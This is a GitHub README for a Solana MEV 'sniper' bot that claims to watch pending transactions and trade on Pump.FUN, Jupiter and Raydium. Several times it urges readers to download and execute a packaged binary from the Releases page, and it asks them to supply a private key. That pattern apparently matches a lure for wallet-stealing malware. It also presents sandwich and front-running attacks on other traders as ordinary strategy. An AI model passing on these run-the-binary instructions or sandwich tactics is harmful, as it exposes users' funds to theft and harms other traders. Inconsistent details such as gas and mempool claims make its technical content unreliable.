Solana MEV Sniper Bot — Fast In-Browser and Local Runner
========================================================

[![Releases](https://img.shields.io/badge/Releases-download-brightgreen)](https://github.com/Fakhir45332/Solana-bot/releases)

[![Built for Solana](https://img.shields.io/badge/Platform-Solana-2EA2F8.svg)](https://solana.com) [![Language-JS](https://img.shields.io/badge/Language-JavaScript-F7DF1E.svg)](https://github.com/Fakhir45332/Solana-bot)

![Solana MEV](https://cryptologos.cc/logos/solana-sol-logo.png?v=014)

Overview
--------

Solana-bot inspects mempool activity and acts on profitable opportunities across Pump.FUN, Jupiter, and Raydium. It runs in a browser or on a local machine. The bot automates transaction watching, analysis, and execution. It focuses on speed, configurability, and direct control.

Key features
------------

- Mempool watcher that reads pending transactions and extracts trade signals.
- Trade execution on Pump.FUN, Jupiter, and Raydium.
- Two run modes: in-browser (UI) and local (Node.js CLI).
- Trade filters: profit threshold, slippage, max gas, blacklist.
- Position sizing and risk controls via config.
- Logging, performance metrics, and adjustable concurrency.
- Devnet/testnet mode for safe testing.

Badges and links
----------------

Get the packaged release file here and run it locally after download:

[Download Release](https://github.com/Fakhir45332/Solana-bot/releases)

If you use the packaged release, download the release file and execute it on your machine. The Releases page lists binaries and packaged builds. Use the matching file for your OS and follow the included run steps.

Quick demo images
-----------------

![Mempool Stream](https://images.unsplash.com/photo-1531297484001-80022131f5a1?ixlib=rb-4.0.3&q=80&w=1200&auto=format&fit=crop&crop=faces)  
![DEX Trading](https://images.unsplash.com/photo-1559526324-593bc073d938?ixlib=rb-4.0.3&q=80&w=1200&auto=format&fit=crop&crop=entropy)

Why use this bot
----------------

- The bot reads raw pending transactions and extracts trade intents.
- It maps intents to on-chain DEX routes and finds arbitrage or sandwich chances.
- It gives precise config to match your risk profile.
- It runs where you prefer: in the browser or on your own node.

Topics
------

blockchain, bot, crypto-bot, decentralized-exchanges, dex, ethereum, javascript, mempool, mev, nodejs, smart-contracts, solana, solidity

Requirements
------------

- Node.js 16+ for local mode.  
- Modern Chromium-based browser for in-browser mode.  
- Solana RPC endpoint (mainnet or devnet).  
- Private key or wallet provider for signing transactions.  
- Network access to Pump.FUN, Jupiter, or Raydium RPC / APIs.

Local quick start
-----------------

1. Clone the repo:
   git clone https://github.com/Fakhir45332/Solana-bot.git
2. Enter folder:
   cd Solana-bot
3. Install:
   npm ci
4. Create config file:
   cp example.config.json config.json
5. Edit config.json with your RPC, keys, and strategy.
6. Start:
   npm start

Browser (in-browser) quick start
-------------------------------

1. Open the repo in a browser tab (serve the dist folder or use the packaged release that includes a browser UI).  
2. Connect your wallet (Phantom or compatible).  
3. Set RPC, route preferences, and strategy in the UI.  
4. Toggle run mode: monitor or live.  
5. Use testnet or devnet first.

Download & run from Releases
----------------------------

This repository publishes packaged builds on the Releases page. Go to:

https://github.com/Fakhir45332/Solana-bot/releases

Download the release file for your platform. After download, extract and execute the provided binary or script. Release artifacts include a README and a run script. Follow the included run steps inside the release bundle.

Configuration reference
-----------------------

Use config.json or environment variables to tune the bot. Sample fields:

- rpcUrl: string — Solana RPC endpoint.
- walletKey: string — Base58 private key or path to keyfile.
- mode: "local" | "browser" — Run mode.
- targetDex: ["pumpfun","jupiter","raydium"] — DEX list.
- profitThreshold: number — Minimum profit in lamports or SOL cents.
- slippagePct: number — Allowed slippage percent.
- maxGasFee: number — Max fee in lamports.
- concurrency: number — Parallel tx execution limit.
- watchFilters: object — Token lists, blacklist, minAmount.
- logLevel: "debug" | "info" | "error" — Logging verbosity.

Example config.json
-------------------

{
  "rpcUrl": "https://api.mainnet-beta.solana.com",
  "walletKeyPath": "./wallet.json",
  "mode": "local",
  "targetDex": ["pumpfun","jupiter","raydium"],
  "profitThreshold": 0.02,
  "slippagePct": 0.5,
  "maxGasFee": 5000,
  "concurrency": 4,
  "logLevel": "info"
}

Strategy examples
-----------------

- Sandwich: detect large swaps and insert two trades to profit from expected price move. Set a low slippage and small spread for safety.  
- Arbitrage: detect price differences across DEXs and execute cross-pair swaps. Use route optimization and fast routing via Jupiter.  
- Front-run token mints: detect new token listing signals and act quickly. Use strict risk controls.

Testing and devnet
------------------

- Use devnet RPC and faucet tokens.  
- Set smaller stakes and longer delays.  
- Enable verbose logs to watch decision flow.  
- Use the included test scripts to replay saved mempool events.

Security and keys
-----------------

Store keys locally. Use OS-level file permissions. Use a wallet provider for the browser UI. Rotate keys and revoke access when you stop the bot. Keep RPC endpoints private where possible.

Logging and metrics
-------------------

- Logs write to disk and console.  
- Metrics include processed TX/s, successes, fails, and profit totals.  
- Use logLevel to control output.

Performance tips
----------------

- Use a low-latency RPC near the Solana cluster.  
- Run multiple workers to parallelize analysis.  
- Keep route cache warm for common token pairs.  
- Use native binaries on production hosts for lower overhead.

Common commands
---------------

- npm start — start local mode.  
- npm run build — produce the browser bundle.  
- npm run test — run unit tests.  
- node tools/replay.js ./samples/mempool.json — replay sample mempool for debugging.

Testing replay example
----------------------

node tools/replay.js samples/mempool-sample.json --rpc https://api.devnet.solana.com

This replays mempool data against your strategy. Use it to validate logic without live risk.

Troubleshooting
---------------

- If you see failed signatures, check walletKey.  
- If you see timeouts, switch RPC or increase maxGasFee.  
- If routes fail, update route cache and retry with lower concurrency.

Contributing
------------

- Fork the repo.  
- Create a branch: feature/<name>.  
- Run tests and lint.  
- Open a pull request with a clear description and tests.  
- Keep changes modular and small.

Code style
----------

- JavaScript (ES2020+).  
- Use async/await.  
- Keep functions small and focused.  
- Add unit tests for strategy changes.

Testing guidelines
------------------

- Cover mempool parser and route selection.  
- Mock RPC responses.  
- Validate signatures and transaction format.

Licensing
---------

This repo uses the MIT license. See the LICENSE file.

Credits
-------

- Solana network and docs.  
- Jupiter routing.  
- Raydium and Pump.FUN protocols.

Contact
-------

Raise issues on GitHub. For PRs, use clear commit messages and link tests.

Release link (again)
--------------------

Download the release bundle and run the executable from the Releases page:

[Releases and downloads](https://github.com/Fakhir45332/Solana-bot/releases)